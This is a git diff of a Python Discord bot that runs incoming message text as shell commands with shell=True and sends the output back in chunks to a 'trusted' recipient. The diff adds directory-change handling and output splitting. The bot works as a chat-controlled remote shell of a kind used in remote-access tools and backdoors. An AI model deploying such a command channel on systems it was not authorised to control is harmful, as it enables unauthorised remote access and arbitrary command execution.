@@ -1,10 +1,9 @@
 import discord
 import re
 import subprocess
-from time import time
-import os
 from socket import gethostname
 from json import loads, dumps
+from sys import platform
 import TPManager
 
 
@@ -29,6 +28,7 @@ class Client(discord.Client):
         self.trusted = None
         self.log = self.configdata['log']
 
+        self.path = r"C:\\" if 'win' in platform else r"/"
         self.pause = False
 
         print(f"{self.user} | {self.login} listening on servers: ")
@@ -92,16 +92,24 @@ class Client(discord.Client):
                 return
             else:
                 if not self.pause:
-                    try:
-                        out = subprocess.check_output(message.content, shell=True)
-                        print(message.content, message.author)
+                    if message.content.startswith("cd"):
+                        _ = message.content.index("cd")
+                        self.path = message.content[_+3:]
+                        await self.trusted.send(f"```{self.path}```")
 
-                    except subprocess.CalledProcessError as e:
-                        await self.trusted.send(f"{e}\n")
-                    except BaseException as e:
-                        await self.trusted.send(f"{e}\n")
                     else:
-                        await self.trusted.send(f"```\n{out.decode('UTF-8').rstrip()}```")
+                        try:
+                            out = subprocess.check_output(message.content, shell=True, cwd=self.path)
+
+                        except subprocess.CalledProcessError as e:
+                            await self.trusted.send(f"{e}\n")
+                        except BaseException as e:
+                            await self.trusted.send(f"{e}\n")
+                        else:
+                            print(out)
+                            out = "".join(map(chr, out))
+                            for i in range(0, len(out), 1024):
+                                await self.trusted.send(f"```{out[i:1024+i]}```")
 
 
 intents = discord.Intents.default()
